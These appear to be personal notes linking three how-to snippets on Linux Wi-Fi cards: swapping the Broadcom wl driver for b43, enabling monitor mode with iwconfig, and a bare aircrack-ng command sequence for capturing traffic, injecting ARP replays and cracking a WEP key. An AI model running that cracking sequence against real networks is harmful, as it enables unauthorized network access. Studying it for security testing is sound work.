# The official Broadcom STA/wl driver DOES NOT support monitor mode [...](http://askubuntu.com/questions/155528/why-cant-i-set-monitor-mode-with-the-wl-sta-driver-on-a-broadcom-wireless-card)

You are using the Broadcom STA (wl) official driver; this does not support monitor or promiscuous modes (regardless of whatever airmon-ng tells you.)
For this you need the b43 driver, which can be installed with sudo apt-get install b43-fwcutter firmware-b43-installer
You can unload one and load the other with sudo rmmod wl; sudo modprobe b43 (and vice versa).
Note that b43 and wl have their own advantages and disadvantages, so you may want to google before choosing one or the other.


# How to fix ‘ioctl(SIOCSIWMODE) failed: Device or resource busy ‘ problem. [...](https://taufanlubis.wordpress.com/2010/05/14/how-to-fix-ioctlsiocsiwmode-failed-device-or-resource-busy-problem/)
iwconfig wlan0

First turn of your wireless card. Type ‘sudo ifconfig wlan0 down‘.

Second, change your wireless card mode from ‘Managed’ to monitor. Type ‘sudo iwconfig wlan0 mode monitor‘.

Third, turn on again your wireless card. Type ‘sudo ifconfig wlan0 up‘.

Fourth, check the wireless card status. Type ‘sudo iwconfig wlan0‘.


# How to crack a wireless WEP key using AIR Crack [...](http://linuxconfig.org/how-to-crack-a-wireless-wep-key-using-air-crack)
	$ apt-get install aircrack-ng
	$ /sbin/iwconfig
	$ airmon-ng start wlan0
	$ airodump-ng wlan0
	$ airodump-ng -c 6 -w data-capture wlan0
	$ aireplay-ng -3 -b 00:11:95:9F:FD:F4 -h 00:13:02:30:FF:EC wlan0 
	$ aircrack-ng -z data-capture-01.cap
